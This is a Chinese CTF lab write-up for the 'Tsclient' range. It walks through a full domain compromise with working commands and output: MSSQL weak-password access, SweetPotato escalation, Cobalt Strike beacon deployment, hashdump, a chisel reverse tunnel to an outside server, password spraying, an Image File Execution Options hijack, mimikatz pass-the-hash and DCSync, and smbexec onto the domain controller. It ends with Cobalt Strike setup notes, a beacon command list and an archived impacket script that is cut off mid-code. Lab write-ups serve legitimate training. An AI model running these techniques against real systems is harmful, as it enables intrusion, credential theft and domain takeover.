---
title: "春秋云境-Tsclient"
description: "Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。"
date: 2025-08-01
tags:
  - "春秋云境"
  - "Tsclient"
  - "域渗透"
  - "代理转发"
authors:
  - "bx"
draft: false              # 设为 true 则为草稿
slug: "tsclient"          # 随机URL字符串
---
<meta name="referrer" content="no-referrer">

# 春秋云境-Tsclient&Cobalt Strike学习

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754279889160-4de3ffce-f8d7-4f01-9ae5-3be8e7038f1d.png)

Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。

```python
❯ .\fscan.exe -h 39.99.128.61
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1

[716ms]     已选择服务扫描模式
[716ms]     开始信息扫描
[716ms]     最终有效主机数量: 1
[718ms]     开始主机扫描
[718ms]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[718ms]     有效端口数量: 233
[748ms] [*] 端口开放 39.99.128.61:80
[1.8s] [*] 端口开放 39.99.128.61:1433
[3.7s]     扫描完成, 发现 2 个开放端口
[3.7s]     存活端口数量: 2
[3.7s]     开始漏洞扫描
[3.7s]     POC加载完成: 总共387个，成功387个，失败0个
[5.1s] [*] 网站标题 http://39.99.128.61       状态码:200 长度:703    标题:IIS Windows Server
[21.5s] [+] MSSQL 39.99.128.61:1433 sa 1qaz!QAZ
[21.5s]     扫描已完成: 3/3
```

扫描 发现是 IIS 服务 

然后扫描到 MSSQL 密码泄露

我们使用 MDUT 连接上去

##  flag01
连接上来

4 个模式，经过测试 SpOA 可以执行命令 

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754280363704-8ed08222-77b9-4651-bff6-486cd1f82e7d.png)

当前权限过低什么也操作不了，上传土豆

提权到 system

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754280829271-eb8de10d-2fd3-4878-9d2a-85bc8c8516a9.png)

有权限了，先读取这个机器的 flag

```python
C:/迅雷下载/SweetPotato.exe -a "type C:\Users\Administrator\flag\flag01.txt"
```

结果如下 

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754280897682-c135bd83-8927-44e6-b87c-95cca6d7aff0.png)

继续渗透 

## flag02
根据题目要求我们上线 CS，用 system 权限给，不然什么也干不了

```python
C:/迅雷下载/SweetPotato.exe -a "C:/Users/Public/beacon.exe"
```

ok 成功上线

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754282849749-6c91cc78-743e-419c-9c89-87cbc2a04b3c.png)

我们获取一下信息和随便测一下

我们在 CS 中执行

```python
hashdump
```

最后结果如下

```python
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2caf35bb4c5059a3d50599844e2b9b1f:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
John:1008:aad3b435b51404eeaad3b435b51404ee:eec9381b043f098b011be51622282027:::

```

所有用户的 LM 哈希都是 aad3b435b51404eeaad3b435b51404ee。这是一个特殊的哈希值，代表着“空”的 LM 哈希。这通常意味着：

系统禁用了 LM 哈希的存储（这是现代 Windows 系统的默认安全设置）。



查看在线用户可以发现还存在一个 John 用户

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754281697142-31936f09-d7c5-44db-bd54-68593ba36794.png)

进行注入进程上线，然后进入 john 用户

> 试几个进程
>

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754282000893-240e4c7b-1a50-4981-974e-8bbb0115e232.png)

可以发现注入成功，这里也是上线了 

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754281985693-fb1d680b-1113-4475-b8b2-f5ea555f664f.png)

可以发现存在共享文件夹📂

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754282153435-4d45ea6b-4418-4e82-8c5f-e05cd452aff7.png)

查看文件

```python
shell dir \\tsclient\c
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754282475992-100bb6f6-8de9-4032-a758-25b3b7338ab4.png)

```python
shell type \\tsclient\c\credential.txt
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754288503759-b8bbb3fc-b10a-4f79-a76e-6b6cb8696996.png)

得到一个密码

```python
xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#

#提示
hijiack Image
就是映像劫持 
```

根据提示，先了解一下什么是映像劫持，怎么利用

[内网权限维持——映像劫持&CLR劫持-CSDN博客](https://blog.csdn.net/qq_55202378/article/details/140895624)

查看一下机子信息

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754287797339-f5b1114f-1018-4110-8e85-8e1c5a197cbc.png)

```python
shell C:\Users\fscan.exe -h 172.22.8.0/24 > C:\Users\Public\1.txt
```

上传 fscan

扫描一下内网

```python
存活主机（ICMP）：172.22.8.18, 172.22.8.15, 172.22.8.31, 172.22.8.46
有效端口数量: 17
开放端口示例：
172.22.8.18:139, 172.22.8.31:445, 172.22.8.31:139, 172.22.8.31:135, ...
发现的主机名（部分）：
172.22.8.46: WIN2016
172.22.8.31: WIN19-CLIENT
172.22.8.15: DC01
172.22.8.18: WIN-WEB
网站标题：
http://172.22.8.18 状态码:200 长度:703 标题:IIS Windows Server
http://172.22.8.46 状态码:200 长度:703 标题:IIS Windows Server
发现 MSSQL 弱口令：
MSSQL 172.22.8.18:1433 sa 1qaz!QAZ
```

18 机子我们已经拿下来了 

根据刚才的提示，继续上 chisel 代理一下

```python
C:/Users/Public/SweetPotato.exe -a "C:/Users/Public/chisel.exe client 43.134.9.57:8000 R:0.0.0.0:1080:socks"
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754288437946-4d4dba5e-4b91-46a0-957c-5896d48b4ee3.png)

开启代理，喷撒一下刚刚给的密码

> 这里利用crackmapexec 工具
>

```python
┌──(root㉿kali)-[/mnt/hgfs/shared]
└─# proxychains crackmapexec smb 172.22.8.1/24 -u Aldrich -p 'Ald@rLMWuy7Z!#' -d xiaorang.lab 2>/dev/null

[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing WINRM protocol database
[*] Initializing MSSQL protocol database
[*] Initializing FTP protocol database
[*] Initializing SSH protocol database
[*] Initializing RDP protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         172.22.8.46     445    WIN2016          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)
SMB         172.22.8.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)
SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
SMB         172.22.8.18     445    WIN-WEB          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
SMB         172.22.8.15     445    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
SMB         172.22.8.18     445    WIN-WEB          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_LOGON_FAILURE 
```

这里发现三个提示是密码过期了

```python
SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
SMB         172.22.8.18     445    WIN-WEB          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
SMB         172.22.8.15     445    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
```

利用脚本批量改下密码 

```python
proxychains python3 smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.15 -newpass 'U*MT%yB22fU5aT'
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754290247910-22c4f958-cb41-48a6-bbcf-b87727e99065.png)

15 机子，连不上

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754290356428-82a81f29-cddd-448f-aa59-02205bfd37a7.png)

RDP 尝试连接 46 机子

```python
aldrich@xiaorang.lab
U*MT%yB22fU5aT
```

连上来

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754291322022-1a405eea-da32-413b-ba8c-f8652c91492a.png)

在 PS 中执行命令，查看权限

```python
get-acl -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl *
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754290883083-1f98c6b0-37c3-4dfd-b6c3-b22f33303094.png)

```python
PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentV
                          ersion\Image File Execution Options
PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentV
                          ersion
PSChildName             : Image File Execution Options
PSDrive                 : HKLM
PSProvider              : Microsoft.PowerShell.Core\Registry
CentralAccessPolicyId   :
CentralAccessPolicyName :
Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentV
                          ersion\Image File Execution Options
Owner                   : NT AUTHORITY\SYSTEM
Group                   : NT AUTHORITY\SYSTEM
Access                  : {System.Security.AccessControl.RegistryAccessRule, System.Security.AccessControl.RegistryAcce
                          ssRule, System.Security.AccessControl.RegistryAccessRule, System.Security.AccessControl.Regis
                          tryAccessRule...}
Sddl                    : O:SYG:SYD:PAI(A;CIIO;KA;;;CO)(A;CI;CCDCLCSWRPRC;;;AU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;B
                          U)(A;CI;KR;;;AC)
AccessToString          : CREATOR OWNER Allow  FullControl
                          NT AUTHORITY\Authenticated Users Allow  SetValue, CreateSubKey, ReadKey
                          NT AUTHORITY\SYSTEM Allow  FullControl
                          BUILTIN\Administrators Allow  FullControl
                          BUILTIN\Users Allow  ReadKey
                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
AuditToString           :
AccessRightType         : System.Security.AccessControl.RegistryRights
AccessRuleType          : System.Security.AccessControl.RegistryAccessRule
AuditRuleType           : System.Security.AccessControl.RegistryAuditRule
AreAccessRulesProtected : True
AreAuditRulesProtected  : False
AreAccessRulesCanonical : True
AreAuditRulesCanonical  : True
```

我们登录的人都可以修改注册表

```python
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754291006508-a4e3b3d0-41ed-465c-98bb-1b54d2718f79.png)

> **给 **`**magnify.exe**`**设置了一个"调试器",当用户或系统启动 magnify.exe 时，并不会真正启动放大镜程序，而是启动了 C:\windows\system32\cmd.exe**
>

放大镜提权

1. 先进入锁定界面
2. 然后点击图片中右下角图标
3. 选择发大镜
4. 触发进入 System 权限终端

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754291377800-d1a4d6af-e45f-450c-925c-c02ee0081b99.png)

为了方便命令执行

我们设置	CS 转发，在原来机子的基础上，访问内部网络

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754293595044-31c15544-3f75-4efb-ad27-8534a8b16ab9.png)

但是不是很稳定，过个几分钟就会崩溃掉

也是拿到 flag2

```python
shell type C:\Users\Administrator\flag\flag02.txt
```

## flag03
上传猕猴桃

> RDP 里面可以直接粘贴复制本机文件和内容
>

我直接上传到桌面`C:\Users\Aldrich\Desktop`

获取一些信息

```python
logonpasswords
shell net user /domain
```

就是发现`win2016$`在域管组里面

找到对应的 HASH 值

_这里图片没截图好，抱歉_

```python
shell C:\\Users\\Aldrich\\Desktop\\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:WIN2016$ /domain:xiaorang.lab /ntlm:e2b1058677aab11c6b7359eb7d8d4d77" "exit"
```

获得对应 hash 值

```python
shell C:\\Users\\Aldrich\\Desktop\\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:xiaorang.lab /all /csv" "exit"
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754293502665-c25a9097-22d7-4399-bf10-9a84580c55cf.png)

最后使用**Pass-the-Hash**

```python
┌──(root㉿kali)-[/mnt/…/shared/impacket-0.12.0/impacket-0.12.0/examples]
└─# proxychains python3 smbexec.py -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 administrator@172.22.8.15

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  43.134.9.57:1088  ...  172.22.8.15:445  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>type C:\Users\Administrator\flag\flag03.txt
 _________               __    _                  _    
|  _   _  |             [  |  (_)                / |_  
|_/ | | \_|.--.   .---.  | |  __  .---.  _ .--. `| |-' 
    | |   ( (`\] / /'`\] | | [  |/ /__\\[ `.-. | | |   
   _| |_   `'.'. | \__.  | |  | || \__., | | | | | |,  
  |_____| [\__) )'.___.'[___][___]'.__.'[___||__]\__/  


Congratulations! ! !

flag03: flag{47227631-3839-45c1-ae12-8fe7a6d876f6}

```

执行这个脚本可以获得一个命令执行的交互

我们得到这个 15 机子的 system 权限

得到 flag03

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754293301319-fa58f1e9-2043-4c37-975f-8ad4fa71940e.png)



## Others
### Cobalt Strike
可能现在都用的是 CS 的衍生工具

#### 搭建 cs 平台


如何配置 CS 看下面这个文章

[Cobalt Strike 安装与配置 | XSTARK](https://red.lintstar.top/RAT/CobaltStrike/deploy)

安装 Java 11huanjing

```python
sudo apt install openjdk-11-jdk
```

配置 server

```python
43.134.9.57
./teamserver 43.134.9.57 pass
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754279183471-d89e859e-7d38-4531-b0c0-15f222fffc8c.png)

在 client 连接进来

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754279352877-f92716f4-9172-4136-9e50-8976025d4a14.png)



#### Payload 种类和选择 
1. **HTML Application**
    - 生成一个 .hta 格式的恶意 HTML 应用程序，适合用于钓鱼邮件、Web social engineering 等场景，在目标浏览器中执行后触发 payload。
2. **MS Office Macro**
    - 生成一个可嵌入 Word、Excel 等 Office 文件的宏（VBA 脚本），适合钓鱼邮件附件。目标打开文档并启用宏后，执行 payload。
3. **Stager Payload Generator**
    - 生成"小体积的第一阶段加载器"，主要用于下载和加载真正的 beacon（即二阶段 payload）。适合需要先绕过杀软、再拉下主 beacon 的场景。
    - 通常体积小、隐蔽性好，但依赖网络二次下载。
4. **Stageless Payload Generator**
    - 生成"一步到位的主载荷"，不会分阶段，所有代码都打包在一个文件中，适合不受网络限制、对体积要求不高的场景。
    - 更稳定，但体积较大，检测率有时更高。
5. **Windows Stager Payload**
    - 专门为 Windows 平台生成"分阶段"payload（即先下 stager，再加载 beacon）。
    - 适合在 Windows 靶机上先执行一小段代码，随后自动回连主 beacon。
6. **Windows Stageless Payload**
    - 专门为 Windows 平台生成"一步到位"的 payload，所有内容打包进一个文件。
    - 适合直接部署到 Windows 靶机，执行后直接上线。
7. **Windows Stageless Generate All Payloads**
    - 一次性为 Windows 平台生成所有主流格式的"一步到位"payload，比如 exe、dll、ps1、bin 等。



#### Beacon 内置命令
```python
argue			命令行参数欺骗
blockdlls			禁止子进程加载非微软签名的dll
browserpivot			注入浏览器进程代理用户已认证身份（仅支持IE）
cancel			取消正在下载的文件
cd			跳转目录
checkin			强制目标回连并更新状态（用于DNS上线，DNS模式下无新任务时目标不会回连Teamserver）
chromedump			提取Chrome保存的账号密码、Cookies等信息
covertvpn			部署Covert VPN客户端
clear			清空beacon任务队列
connect			通过TCP正向连接远程Beacon
cp			复制文件
dcsync			从域控提取密码hash
desktop			远程VNC控制用户桌面
dllinject		注入一个内存反射加载的dll到目标进程
dllload			使用LoadLibrary方式在目标进程中加载一个dll
download		下载文件
downloads		列出所有正在下载的文件
drives			列出所有磁盘盘符
elevate			利用提权漏洞获取一个高权限Beacon
execute			在目标上执行程序（无回显）
execute-assembly	在目标上内存加载执行本地.NET程序
exit			结束当前Beacon会话
getprivs		在当前进程访问令牌（access token）中启用system特权
getsystem		尝试获取SYSTEM用户权限
getuid			获取当前进程访问令牌（access token）的用户信息
hashdump		获取本地用户hash
history			显示历史命令记录
help			帮助信息
inject			在指定进程中注入新的Beacon会话
inline-execute		在当前会话中执行Beacon Object File
jobs			列出所有后台任务
jobkill			结束一个后台任务
jump			在远程机器上植入Beacon（横向移动）
kerberos_ccache_use		从ccache文件导入kerberos票据到当前会话中
kerberos_ticket_purge	清空当前会话中的所有kerberos票据
kerberos_ticket_use		从ticket文件中导入kerberos票据到当前会话中
keylogger		开启键盘记录
kill			结束指定进程
link			通过命名管道正向连接远程Beacon
logonpasswords		使用mimikatz获取密码和hash
ls			列出目录文件
make_token		创建进程访问令牌（access token），仅用于访问网络资源
mimikatz		运行mimikatz
mkdir			创建目录
mode dns		使用DNS A记录作为数据通道（仅支持DNS上线Beacon）
mode dns6		使用DNS AAAA记录作为数据通道（仅支持DNS上线Beacon）
mode dns-txt		使用DNS TXT记录作为数据通道（仅支持DNS上线Beacon）
mv			移动文件
net			网络和主机探测工具（内置net命令）
note			给当前会话添加备注信息
portscan		网络端口扫描
powerpick		内存执行Powershell命令（不调用powershell.exe）
powershell		通过powershell.exe执行Powershell命令
powershell-import	导入本地powershell脚本到当前会话中
ppid			为所有新运行的进程设置伪造的父进程PID
printscreen		使用PrintScr方式截屏
ps			显示进程列表
psinject		注入到指定进程后在内存中执行Powershell命令（不调用powershell.exe)
pth			使用Mimikatz执行Pass-the-hash
pwd			显示当前目录
reg			查询注册表
remote-exec		在远程机器上执行命令（横向移动）
rev2self		恢复原始进程访问令牌（access token）
rm			删除文件或文件夹
rportfwd		反向端口转发（从Cobalt Strike Teamserver发起连接）
rportfwd_local		反向端口转发（从Cobalt Strike客户端发起连接）
run			在目标上执行程序（有回显）
runas			以另一个用户身份执行程序
runasadmin		以高权限执行程序
runu			以另一个进程PID作为父进程PID，并以其用户身份执行程序
screenshot		截屏
screenwatch		屏幕监控，每隔一段时间截屏
setenv			设置环境变量
shell			使用cmd.exe执行命令
shinject		注入shellcode到指定进程中
shspawn			创建傀儡进程并注入shellcode到其中运行
sleep			设置beacon回连间隔时间
socks			启动SOCKS4a代理服务器
socks stop		停止SOCKS4a代理服务器
spawn			创建一个新Beacon会话
spawnas			以另一个用户身份创建一个新Beacon会话
spawnto			设置创建新进程时使用的可执行文件路径（傀儡进程的宿主exe文件路径）
spawnu			以另一个进程PID作为父进程PID，并以其用户身份创建一个新Beacon会话
spunnel			运行第三方agent shellcode并将其反向代理到控制端（从Cobalt Strike Teamserver发起连接）
spunnel_local		运行第三方agent shellcode并将其反向代理到控制端（从Cobalt Strike客户端发起连接）
ssh			通过SSH连接远程主机（使用账号密码认证）
ssh-key			通过SSH连接远程主机（使用证书私钥认证）
steal_token		从指定进程中窃取访问令牌（access token)
timestomp		复制B文件的创建、访问、修改时间戳到A文件（文件时间戳伪造）
unlink			断开与beacon的连接（用于通过TCP、命名管道连接的beacon）
upload			上传文件
!			运行历史命令
```



### smbpasswd.py 存档
[https://lira.epac.to/DOCS/python3-impacket/examples/smbpasswd.py](https://lira.epac.to/DOCS/python3-impacket/examples/smbpasswd.py)

```python
#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#  	This script is an alternative to smbpasswd tool and intended to be used
#  	for changing passwords remotely over SMB (MSRPC-SAMR). It can perform the
#  	password change when the current password is expired, and supports NTLM
#  	hashes as a new password value instead of a plaintext value. As for the
#  	latter approach the new password is flagged as expired after the change
#  	due to how SamrChangePasswordUser function works.
#
# 	Examples:
#  		smbpasswd.py j.doe@192.168.1.11
#  		smbpasswd.py contoso.local/j.doe@DC1 -hashes :fc525c9683e8fe067095ba2ddc971889
#  		smbpasswd.py contoso.local/j.doe:'Passw0rd!'@DC1 -newpass 'N3wPassw0rd!'
#  		smbpasswd.py contoso.local/j.doe:'Passw0rd!'@DC1 -newhashes :126502da14a98b58f2c319b81b3a49cb
#  		smbpasswd.py contoso.local/j.doe:'Passw0rd!'@DC1 -newpass 'N3wPassw0rd!' -altuser administrator -altpass 'Adm1nPassw0rd!'
#  		smbpasswd.py contoso.local/j.doe:'Passw0rd!'@DC1 -newhashes :126502da14a98b58f2c319b81b3a49cb -altuser CONTOSO/administrator -altpass 'Adm1nPassw0rd!' -admin
#  		smbpasswd.py SRV01/administrator:'Passw0rd!'@10.10.13.37 -newhashes :126502da14a98b58f2c319b81b3a49cb -altuser CONTOSO/SrvAdm -althash 6fe945ead39a7a6a2091001d98a913ab
#
# Author:
#  	@snovvcrash
#  	@bransh
#  	@alefburzmali
#
# References:
#  	https://snovvcrash.github.io/2020/10/31/pretending-to-be-smbpasswd-with-impacket.html
#  	https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/
#  	https://github.com/samba-team/samba/blob/master/source3/utils/smbpasswd.c
#  	https://github.com/SecureAuthCorp/impacket/pull/381
#  	https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/acb3204a-da8b-478e-9139-1ea589edb880
#  	https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476
#  	https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/538222f7-1b89-4811-949a-0eac62e38dce
#

import sys
import logging
from getpass import getpass
from argparse import ArgumentParser

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.dcerpc.v5 import transport, samr


class SMBPasswd:

	def __init__(self, address, domain='', username='', oldPassword='', newPassword='', oldPwdHashLM='', oldPwdHashNT='', newPwdHashLM='', newPwdHashNT=''):
		self.address = address
		self.domain = domain
		self.username = username
		self.oldPassword = oldPassword
		self.newPassword = newPassword
		self.oldPwdHashLM = oldPwdHashLM
		self.oldPwdHashNT = oldPwdHashNT
		self.newPwdHashLM = newPwdHashLM
		self.newPwdHashNT = newPwdHashNT
		self.dce = None

	def connect(self, domain='', username='', password='', nthash='', anonymous=False):
		rpctransport = transport.SMBTransport(self.address, filename=r'\samr')
		if anonymous:
			rpctransport.set_credentials(username='', password='', domain='', lmhash='', nthash='', aesKey='')
		elif username != '':
			lmhash = ''
			rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey='')
		else:
			rpctransport.set_credentials(self.username, self.oldPassword, self.domain, self.oldPwdHashLM, self.oldPwdHashNT, aesKey='')

		self.dce = rpctransport.get_dce_rpc()
		self.dce.connect()
		self.dce.bind(samr.MSRPC_UUID_SAMR)

	def hSamrUnicodeChangePasswordUser2(self):
		try:
			resp = samr.hSamrUnicodeChangePasswordUser2(self.dce, '\x00', self.username, self.oldPassword, self.newPassword, self.oldPwdHashLM, self.oldPwdHashNT)
		except Exception as e:
			if 'STATUS_PASSWORD_RESTRICTION' in str(e):
				logging.critical('Some password update rule has been violated. For example, the password may not meet length criteria.')
			else:
				raise e
		else:
			if resp['ErrorCode'] == 0:
				logging.info('Password was changed successfully.')
			else:
				logging.error('Non-zero return code, something weird happened.')
				resp.dump()

	def hSamrChangePasswordUser(self):
		try:
			serverHandle = samr.hSamrConnect(self.dce, self.address + '\x00')['ServerHandle']
			domainSID = samr.hSamrLookupDomainInSamServer(self.dce, serverHandle, self.domain)['DomainId']
			domainHandle = samr.hSamrOpenDomain(self.dce, serverHandle, domainId=domainSID)['DomainHandle']
			userRID = samr.hSamrLookupNamesInDomain(self.dce, domainHandle, (self.username,))['RelativeIds']['Element'][0]
			userHandle = samr.hSamrOpenUser(self.dce, domainHandle, userId=userRID)['UserHandle']
		except Exception as e:
			if 'STATUS_NO_SUCH_DOMAIN' in str(e):
				logging.critical('Wrong realm. Try to set the domain name for the target user account explicitly in format DOMAIN/username.')
				return
			else:
				raise e

		try:
			resp = samr.hSamrChangePasswordUser(self.dce, userHandle, self.oldPassword, newPassword='', oldPwdHashNT=self.oldPwdHashNT,
                                                newPwdHashLM=self.newPwdHashLM, newPwdHashNT=self.newPwdHashNT)
		except Exception as e:
			if 'STATUS_PASSWORD_RESTRICTION' in str(e):
				logging.critical('Some password update rule has been violated. For example, the password history policy may prohibit the use of recent passwords.')
			else:
				raise e
		else:
			if resp['ErrorCode'] == 0:
				logging.info('NTLM hashes were changed successfully.')
			else:
				logging.error('Non-zero return code, something weird happened.')
				resp.dump()

	def hSamrSetInformationUser(self):
		try:
			serverHandle = samr.hSamrConnect(self.dce, self.address + '\x00')['ServerHandle']
			domainSID = samr.hSamrLookupDomainInSamServer(self.dce, serverHandle, self.domain)['DomainId']
			domainHandle = samr.hSamrOpenDomain(self.dce, serverHandle, domainId=domainSID)['DomainHandle']
			userRID = samr.hSamrLookupNamesInDomain(self.dce, domainHandle, (self.username,))['RelativeIds']['Element'][0]
			userHandle = samr.hSamrOpenUser(self.dce, domainHandle, userId=userRID)['UserHandle']
		except Exception as e:
			if 'STATUS_NO_SUCH_DOMAIN' in str(e):
				logging.critical('Wrong realm. Try to set the domain name for the target user account explicitly in format DOMAIN/username.')
				return
			else:
				raise e
		try:
			resp = samr.hSamrSetNTInternal1(self.dce, userHandle, self.newPassword, self.newPwdHashNT)
		except Exception as e:
			raise e
		else:
			if resp['ErrorCode'] == 0:
				logging.info('Credentials were injected into SAM successfully.')
			else:
				logging.error('Non-zero return code, something weird happened.')
				resp.dump()


def init_logger(options):
	logger.init(options.ts)
	if options.debug is True:
		logging.getLogger().setLevel(logging.DEBUG)
		logging.debug(version.getInstallationPath())
	else:
		logging.getLogger().setLevel(logging.INFO)


def parse_args():
	parser = ArgumentParser(description='Change password over SMB.')

	parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
	parser.add_argument('-ts', action='store_true', help='adds timestamp to every logging output')
	parser.add_argument('-debug', action='store_true', help='turn DEBUG output ON')

	group = parser.add_mutually_exclusive_group()
	group.add_argument('-newpass', action='store', default=None, help='new SMB password')
	group.add_argument('-newhashes', action='store', default=None, metavar='LMHASH:NTHASH', help='new NTLM hashes, format is LMHASH:NTHASH '
                                                                           '(the user will be asked to change their password at next logon)')

	group = parser.add_argument_group('authentication')
	group.add_argument('-hashes', action='store', default=None, metavar='LMHASH:NTHASH', help='NTLM hashes, format is LMHASH:NTHASH')

	group = parser.add_argument_group('RPC authentication')
	group.add_argument('-altuser', action='store', default=None, help='alternative username')
	group.add_argument('-altpass', action='store', default=None, help='alternative password')
	group.add_argument('-althash', action='store', default=None, help='alternative NT hash')

	group = parser.add_argument_group('set credentials method')
	group.add_argument('-admin', action='store_true', help='injects credentials into SAM (requires admin\'s priveleges on a machine, '
		               'but can bypass password history policy)')

	return parser.parse_args()


if __name__ == '__main__':
	print(version.BANNER)

	options = parse_args()
	init_logger(options)

	domain, username, oldPassword, address = parse_target(options.target)

	if domain is None:
		domain = 'Builtin'

	if options.hashes is not None:
		try:
			oldPwdHashLM, oldPwdHashNT = options.hashes.split(':')
		except ValueError:
			logging.critical('Wrong hashes string format. For more information run with --help option.')
			sys.exit(1)
	else:
		oldPwdHashLM = ''
		oldPwdHashNT = ''

	if oldPassword == '' and oldPwdHashNT == '' and not options.admin:
		oldPassword = getpass('Current SMB password: ')

	if options.newhashes is not None:
		try:
			newPwdHashLM, newPwdHashNT = options.newhashes.split(':')
		except ValueError:
			logging.critical('Wrong new hashes string format. For more information run with --help option.')
			sys.exit(1)
		newPassword = ''
	else:
		newPwdHashLM = ''
		newPwdHashNT = ''
		if options.newpass is None:
			newPassword = getpass('New SMB password: ')
			if newPassword != getpass('Retype new SMB password: '):
